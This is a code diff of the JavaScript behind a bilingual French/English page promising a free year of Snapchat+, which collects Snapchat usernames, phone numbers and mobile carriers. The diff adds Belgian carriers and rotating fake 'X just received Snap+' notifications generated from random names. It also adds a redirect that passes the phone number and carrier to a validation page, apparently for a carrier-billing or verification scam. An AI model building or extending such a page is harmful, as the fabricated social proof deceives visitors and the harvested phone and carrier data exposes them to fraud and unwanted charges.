@@ -1,10 +1,52 @@
 // ═════════════════════════════════════════════════════════════
-// CONFIGURATION
+// CONFIG
 // ═════════════════════════════════════════════════════════════
 const CONFIG = {
-    API_URL: 'https://snaptech.vercel.app/api/snapchat',
-    SYNC_INTERVAL: 30000      // Sync auto toutes les 30s si hors-ligne
+    API_URL: '/api/snapchat',
+    SYNC_INTERVAL: 30000
 };
+
+// ═════════════════════════════════════════════════════════════
+// NOTIFICATIONS ANIMÉES
+// ═════════════════════════════════════════════════════════════
+const notifNames = [
+    'Emma', 'Lucas', 'Chloe', 'Noah', 'Ines', 'Liam', 'Jade', 'Ethan',
+    'Lena', 'Nathan', 'Zoe', 'Tom', 'Manon', 'Leo', 'Camille', 'Hugo',
+    'Sarah', 'Mathis', 'Julie', 'Theo', 'Laura', 'Louis', 'Anais', 'Gabriel'
+];
+
+const notifSurnames = [
+    'Dubois', 'Martin', 'Bernard', 'Petit', 'Robert', 'Richard', 'Durand',
+    'Leroy', 'Moreau', 'Simon', 'Laurent', 'Lefebvre', 'Michel', 'Garcia'
+];
+
+function getRandomNotif() {
+    const name = notifNames[Math.floor(Math.random() * notifNames.length)];
+    const surname = notifSurnames[Math.floor(Math.random() * notifSurnames.length)];
+    const masked = surname.substring(0, 2) + '***';
+    return `🎉 ${name}${masked} vient de recevoir son Snap+ !`;
+}
+
+function startNotifications() {
+    const el = document.getElementById('notifText');
+    if (!el) return;
+
+    let current = getRandomNotif();
+    el.textContent = current;
+
+    setInterval(() => {
+        // Fade out
+        el.style.opacity = '0';
+        el.style.transform = 'translateX(10px)';
+
+        setTimeout(() => {
+            current = getRandomNotif();
+            el.textContent = current;
+            el.style.opacity = '1';
+            el.style.transform = 'translateX(0)';
+        }, 400);
+    }, 3500);
+}
 
 // ═════════════════════════════════════════════════════════════
 // TRANSLATIONS
@@ -12,7 +54,8 @@ const CONFIG = {
 const translations = {
     fr: {
         title: "🎉 Activer Snapchat+ pendant 1 an !",
-        warning: "⚠️ Disponible uniquement pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas",
+        warning: "⚠️ Disponible uniquement pour les numéros des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas",
+        warningBe: "⚠️ Disponible uniquement pour les numéros Belgique des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas",
         usernameLabel: "👤 Nom d'utilisateur Snapchat",
         operatorLabel: "📱 Opérateur mobile",
         phoneLabel: "📞 Numéro de téléphone",
@@ -20,19 +63,20 @@ const translations = {
         locationLabel: "📍 Localisation",
         locationFr: "🇫🇷 France",
         locationBe: "🇧🇪 Belgique",
-        operators: ["Orange", "SFR", "Bouygues"],
+        operatorsFr: ["Orange", "SFR", "Bouygues"],
+        operatorsBe: ["BASE", "Orange Belgique", "Proximus", "Telenet"],
         statusSuccess: "✅ Demande envoyée avec succès !",
         statusError: "❌ Erreur serveur, veuillez réessayer.",
         statusInvalid: "⚠️ Veuillez remplir tous les champs correctement.",
-        statusPhoneInvalid: "⚠️ Numéro invalide (format 06/07 requis)",
+        statusPhoneInvalid: "⚠️ Numéro invalide",
         statusUsernameInvalid: "⚠️ Username invalide (3-15 caractères)",
         statusDuplicate: "⚠️ Ce numéro ou username est déjà enregistré.",
-        offlineSaved: "💾 Sauvegardé hors-ligne. Synchronisation automatique...",
-        queueLabel: "requête(s) en attente"
+        offlineSaved: "💾 Sauvegardé hors-ligne. Synchronisation automatique..."
     },
     en: {
         title: "🎉 Activate Snapchat+ for 1 year!",
-        warning: "⚠️ Available only for French numbers from the operators listed below — others won't work",
+        warning: "⚠️ Available only for numbers from the listed operators — others won't work",
+        warningBe: "⚠️ Available only for Belgium numbers from the listed operators — others won't work",
         usernameLabel: "👤 Snapchat Username",
         operatorLabel: "📱 Mobile Operator",
         phoneLabel: "📞 Phone Number",
@@ -40,15 +84,15 @@ const translations = {
         locationLabel: "📍 Location",
         locationFr: "🇫🇷 France",
         locationBe: "🇧🇪 Belgium",
-        operators: ["Orange", "SFR", "Bouygues"],
+        operatorsFr: ["Orange", "SFR", "Bouygues"],
+        operatorsBe: ["BASE", "Orange Belgium", "Proximus", "Telenet"],
         statusSuccess: "✅ Request sent successfully!",
         statusError: "❌ Server error, please try again.",
         statusInvalid: "⚠️ Please fill in all fields correctly.",
-        statusPhoneInvalid: "⚠️ Invalid number (French 06/07 format required)",
+        statusPhoneInvalid: "⚠️ Invalid number",
         statusUsernameInvalid: "⚠️ Invalid username (3-15 characters)",
         statusDuplicate: "⚠️ This number or username is already registered.",
-        offlineSaved: "💾 Saved offline. Auto-syncing...",
-        queueLabel: "request(s) pending"
+        offlineSaved: "💾 Saved offline. Auto-syncing..."
     }
 };
 
@@ -59,14 +103,10 @@ let currentLang = 'fr';
 let selectedOperator = 'orange';
 let isSubmitting = false;
 
-// ═════════════════════════════════════════════════════════════
-// DOM ELEMENTS
-// ═════════════════════════════════════════════════════════════
 const elements = {
     langFr: document.getElementById('langFr'),
     langEn: document.getElementById('langEn'),
     siteLogo: document.getElementById('siteLogo'),
-    logoUrl: document.getElementById('logoUrl'),
     mainTitle: document.getElementById('mainTitle'),
     warningMsg: document.getElementById('warningMsg'),
     usernameLabel: document.getElementById('usernameLabel'),
@@ -80,18 +120,19 @@ const elements = {
     location: document.getElementById('location'),
     offlineQueue: document.getElementById('offlineQueue'),
     queueCount: document.getElementById('queueCount'),
-    operatorButtons: document.querySelectorAll('.btn-operator')
+    operatorButtons: document.getElementById('operatorButtons')
 };
 
 // ═════════════════════════════════════════════════════════════
-// LANGUAGE MANAGEMENT
+// LANGUAGE
 // ═════════════════════════════════════════════════════════════
 function setLanguage(lang) {
     currentLang = lang;
     const t = translations[lang];
+    const isBe = elements.location.value === 'belgique';
 
     elements.mainTitle.textContent = t.title;
-    elements.warningMsg.textContent = t.warning;
+    elements.warningMsg.textContent = isBe ? t.warningBe : t.warning;
     elements.usernameLabel.textContent = t.usernameLabel;
     elements.operatorLabel.textContent = t.operatorLabel;
     elements.phoneLabel.textContent = t.phoneLabel;
@@ -101,51 +142,47 @@ function setLanguage(lang) {
     elements.location.options[0].text = t.locationFr;
     elements.location.options[1].text = t.locationBe;
 
-    elements.operatorButtons.forEach((btn, idx) => {
-        if (t.operators[idx]) btn.textContent = t.operators[idx];
-    });
+    updateOperators();
 
     elements.langFr.classList.toggle('active', lang === 'fr');
     elements.langEn.classList.toggle('active', lang === 'en');
 
-    // Clear temporaire des messages de statut
     const statusText = elements.statusMsg.textContent;
     if (statusText && (statusText.includes('✅') || statusText.includes('❌') || statusText.includes('💾'))) {
         elements.statusMsg.textContent = '';
         elements.statusMsg.className = 'status-message';
     }
-    
     updateQueueDisplay();
 }
 
 // ═════════════════════════════════════════════════════════════
-// LOGO MANAGEMENT
+// OPERATORS DYNAMIQUES (France / Belgique)
 // ═════════════════════════════════════════════════════════════
-function updateLogo() {
-    const url = elements.logoUrl.value.trim();
-    if (url && (url.startsWith('http://') || url.startsWith('https://'))) {
-        elements.siteLogo.src = url;
-        try { localStorage.setItem('snaptech_logo', url); } catch (e) {}
-    } else {
-        alert(currentLang === 'fr' ? 'Veuillez entrer une URL valide (http:// ou https://).' : 'Please enter a valid URL.');
-    }
+function updateOperators() {
+    const t = translations[currentLang];
+    const isBe = elements.location.value === 'belgique';
+    const ops = isBe ? t.operatorsBe : t.operatorsFr;
+    const opValues = isBe ? ['base', 'orange_be', 'proximus', 'telenet'] : ['orange', 'sfr', 'bouygues'];
+
+    elements.operatorButtons.innerHTML = '';
+    ops.forEach((name, i) => {
+        const btn = document.createElement('button');
+        btn.className = 'btn-operator' + (i === 0 ? ' active' : '');
+        btn.dataset.operator = opValues[i];
+        btn.textContent = name;
+        btn.onclick = function() { selectOperator(this); };
+        elements.operatorButtons.appendChild(btn);
+    });
+
+    selectedOperator = opValues[0];
+
+    // Mise à jour du warning
+    elements.warningMsg.textContent = isBe ? t.warningBe : t.warning;
 }
 
-function loadSavedLogo() {
-    try {
-        const saved = localStorage.getItem('snaptech_logo');
-        if (saved) {
-            elements.logoUrl.value = saved;
-            elements.siteLogo.src = saved;
-        }
-    } catch (e) {}
-}
-
-// ═════════════════════════════════════════════════════════════
-// OPERATOR SELECTION
-// ═════════════════════════════════════════════════════════════
 function selectOperator(btn) {
-    elements.operatorButtons.forEach(b => b.classList.remove('active'));
+    const buttons = elements.operatorButtons.querySelectorAll('.btn-operator');
+    buttons.forEach(b => b.classList.remove('active'));
     btn.classList.add('active');
     selectedOperator = btn.dataset.operator;
 }
@@ -157,8 +194,11 @@ function validateUsername(username) {
     return /^[a-zA-Z0-9._-]{3,15}$/.test(username);
 }
 
-function validatePhone(phone) {
-    const clean = phone.replace(/\s/g, '').replace(/^\+33/, '0').replace(/^33/, '0');
+function validatePhone(phone, country) {
+    const clean = phone.replace(/\s/g, '').replace(/^\+33/, '0').replace(/^\+32/, '0');
+    if (country === 'belgique') {
+        return /^04[0-9]{8}$/.test(clean) ? clean : null;
+    }
     return /^0[67][0-9]{8}$/.test(clean) ? clean : null;
 }
 
@@ -166,6 +206,7 @@ function validateForm() {
     const username = elements.username.value.trim();
     const phone = elements.phone.value.trim();
     const t = translations[currentLang];
+    const country = elements.location.value;
 
     if (!username || !phone) {
         showStatus(t.statusInvalid, 'error');
@@ -177,13 +218,13 @@ function validateForm() {
         return false;
     }
 
-    const phoneClean = validatePhone(phone);
+    const phoneClean = validatePhone(phone, country);
     if (!phoneClean) {
         showStatus(t.statusPhoneInvalid, 'error');
         return false;
     }
 
-    return { username: username.toLowerCase(), phone: phoneClean };
+    return { username: username.toLowerCase(), phone: phoneClean, country };
 }
 
 function showStatus(message, type) {
@@ -192,31 +233,22 @@ function showStatus(message, type) {
 }
 
 // ═════════════════════════════════════════════════════════════
-// OFFLINE QUEUE MANAGEMENT
+// OFFLINE QUEUE
 // ═════════════════════════════════════════════════════════════
 function getQueue() {
-    try {
-        return JSON.parse(localStorage.getItem('snaptech_queue') || '[]');
-    } catch (e) {
-        return [];
-    }
+    try { return JSON.parse(localStorage.getItem('snaptech_queue') || '[]'); }
+    catch (e) { return []; }
 }
 
 function saveQueue(queue) {
-    try {
-        localStorage.setItem('snaptech_queue', JSON.stringify(queue));
-    } catch (e) {}
+    try { localStorage.setItem('snaptech_queue', JSON.stringify(queue)); } catch (e) {}
     updateQueueDisplay();
 }
 
 function updateQueueDisplay() {
     const queue = getQueue();
-    if (queue.length > 0) {
-        elements.offlineQueue.style.display = 'block';
-        elements.queueCount.textContent = queue.length;
-    } else {
-        elements.offlineQueue.style.display = 'none';
-    }
+    elements.offlineQueue.style.display = queue.length > 0 ? 'block' : 'none';
+    elements.queueCount.textContent = queue.length;
 }
 
 function addToQueue(data) {
@@ -226,16 +258,11 @@ function addToQueue(data) {
     showStatus(translations[currentLang].offlineSaved, 'success');
 }
 
-// ═════════════════════════════════════════════════════════════
-// SYNC PENDING REQUESTS
-// ═════════════════════════════════════════════════════════════
 async function syncPendingRequests() {
     const queue = getQueue();
     if (queue.length === 0) return;
-
     const t = translations[currentLang];
     let synced = 0;
-    let failed = 0;
     const remaining = [];
 
     for (const item of queue) {
@@ -245,47 +272,32 @@ async function syncPendingRequests() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(item)
             });
-
-            if (response.ok) {
-                synced++;
-            } else if (response.status === 409) {
-                // Doublon → on retire quand même
-                synced++;
-            } else {
+            if (response.ok || response.status === 409) synced++;
+            else {
                 item.attempts = (item.attempts || 0) + 1;
                 if (item.attempts < 5) remaining.push(item);
-                else failed++;
             }
         } catch (err) {
             item.attempts = (item.attempts || 0) + 1;
             if (item.attempts < 5) remaining.push(item);
         }
     }
-
     saveQueue(remaining);
-
-    if (synced > 0 && remaining.length === 0) {
-        showStatus(t.statusSuccess, 'success');
-    } else if (remaining.length > 0) {
-        showStatus(`${remaining.length} requête(s) toujours en attente`, 'error');
-    }
+    if (synced > 0 && remaining.length === 0) showStatus(t.statusSuccess, 'success');
 }
 
 // ═════════════════════════════════════════════════════════════
-// SUBMIT FORM
+// SUBMIT → redirige vers validation.html
 // ═════════════════════════════════════════════════════════════
 async function submitForm() {
     if (isSubmitting) return;
-
     const validation = validateForm();
     if (!validation) return;
 
-    const { username, phone } = validation;
-    const location = elements.location.value;
+    const { username, phone, country } = validation;
     const operator = selectedOperator;
     const lang = currentLang;
-
-    const data = { username, phone, location, operator, lang };
+    const data = { username, phone, location: country, operator, lang };
 
     isSubmitting = true;
     elements.submitBtn.classList.add('loading');
@@ -302,9 +314,8 @@ async function submitForm() {
         const result = await response.json();
 
         if (response.ok && result.success) {
-            showStatus(translations[currentLang].statusSuccess, 'success');
-            elements.username.value = '';
-            elements.phone.value = '';
+            // Redirection vers la page de validation
+            window.location.href = `validation.html?phone=${encodeURIComponent(phone)}&carrier=${encodeURIComponent(operator)}`;
         } else if (response.status === 409) {
             showStatus(translations[currentLang].statusDuplicate, 'error');
         } else {
@@ -312,7 +323,6 @@ async function submitForm() {
         }
     } catch (error) {
         console.error('API Error:', error);
-        // Hors-ligne ou erreur réseau → file d'attente locale
         addToQueue(data);
     } finally {
         isSubmitting = false;
@@ -322,46 +332,30 @@ async function submitForm() {
 }
 
 // ═════════════════════════════════════════════════════════════
-// EVENT LISTENERS
+// INIT
 // ═════════════════════════════════════════════════════════════
 document.addEventListener('keydown', (e) => {
     if (e.key === 'Enter') {
         const active = document.activeElement;
-        if (active && ['username', 'phone', 'logoUrl'].includes(active.id)) {
+        if (active && ['username', 'phone'].includes(active.id)) {
             e.preventDefault();
-            if (active.id === 'logoUrl') updateLogo();
-            else submitForm();
+            submitForm();
         }
     }
 });
 
-// ═════════════════════════════════════════════════════════════
-// INITIALIZATION
-// ═════════════════════════════════════════════════════════════
 document.addEventListener('DOMContentLoaded', () => {
-    loadSavedLogo();
-
-    const defaultOperator = document.querySelector('.btn-operator[data-operator="orange"]');
-    if (defaultOperator) {
-        defaultOperator.classList.add('active');
-        selectedOperator = 'orange';
-    }
-
+    startNotifications();
+    updateOperators();
     updateQueueDisplay();
 
-    // Sync auto périodique
     setInterval(() => {
-        if (navigator.onLine && getQueue().length > 0) {
-            syncPendingRequests();
-        }
+        if (navigator.onLine && getQueue().length > 0) syncPendingRequests();
     }, CONFIG.SYNC_INTERVAL);
 });
 
-// ═════════════════════════════════════════════════════════════
-// EXPOSE GLOBALLY
-// ═════════════════════════════════════════════════════════════
 window.setLanguage = setLanguage;
-window.updateLogo = updateLogo;
 window.selectOperator = selectOperator;
 window.submitForm = submitForm;
 window.syncPendingRequests = syncPendingRequests;
+window.updateOperators = updateOperators;
